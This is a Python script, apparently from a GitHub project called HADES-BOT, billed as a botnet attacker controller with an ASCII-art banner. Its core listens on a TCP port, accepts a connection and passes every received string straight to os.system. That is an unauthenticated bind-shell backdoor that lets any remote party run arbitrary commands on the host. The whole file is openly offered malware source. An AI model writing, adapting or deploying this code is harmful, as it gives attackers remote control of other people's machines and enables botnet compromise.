import socket, readline, os, subprocess,argparse,multiprocessing,platform,sys,time
from colorama import Fore,init
from colorama import Back as bg
from multiprocessing import Process
parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
parser.add_argument('-ip','--attackerip',metavar='',help='')
parser.add_argument('-p','--port',metavar='',help='')
args = parser.parse_args()
init(autoreset=True)
class Controller(object):
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
    @staticmethod
    def show_banner(s):
        for c in s + '\n':
            sys.stdout.write(bg.BLACK + Fore.GREEN + c)
            sys.stdout.flush()
            time.sleep(2. / 100)
        time.sleep(1.5)
        print('-----------------------------------------------------------------')
        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid | Github:https://github.com/abalesluke')
        print('-----------------------------------------------------------------')
        time.sleep(1.5)

    def listen(self):
        server_ip = self.ip
        server_port = self.port
        buffer_values = lambda buff1,buff2 : buff1 * buff2
        buffer_size = buffer_values(10240,1024)
        SEPARATOR = "<sep>"
        s = socket.socket()
        s.bind((server_ip,int(server_port)))
        s.listen(5)
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
        time.sleep(1)
        print(f"Listening as {server_ip}:{server_port}...")
        client_socket, client_address = s.accept()
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
        time.sleep(1.5)
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
        try:
            host = socket.gethostname()
            while True:
                cmd_read = client_socket.recv(buffer_size).decode()
                arbitrary_cmd_exec = os.system(cmd_read)
        except Exception:
            print('\nUsage for help: python3 <file-name.py> -h ')
if __name__ == "__main__":
    main_class = Controller(args.attackerip,args.port)
    banner = Process(target=main_class.show_banner,args=('''
       .:'                                  `:.
 ::'                                    `::
:: :.                                  .: ::
 `:. `:.             .             .:'  .:'
   `::. `::          !           ::' .::'
      `::.`::.    .' ! `.    .::'.::'
        `:.  `::::'':!:``::::'   ::'
        :'*:::.  .:' ! `:.  .:::*`:        H A D E S - B O T
       :: HHH::.   ` ! '   .::HHH ::
      ::: `H TH::.  `!'  .::HT H' :::
      ::..  `THHH:`:   :':HHHT'  ..::   Chaos is everywhere, running and hiding isn't gonna help
      `::      `T: `. .' :T'      ::'    only fighting back is your only option to survive.
        `:. .   :         :   . .:'
          `::'               `::'
            :'  .`.  .  .'.  `:
            :' ::.       .:: `:
            :' `:::     :::' `:
             `.  ``     ''  .'
              :`...........':
              ` :`.     .': '
               `:  `"""'  :'  
    ''',)) 
    listener = Process(target=main_class.listen)
    banner.start()
    banner.join()
    listener.start()
    listener.join()

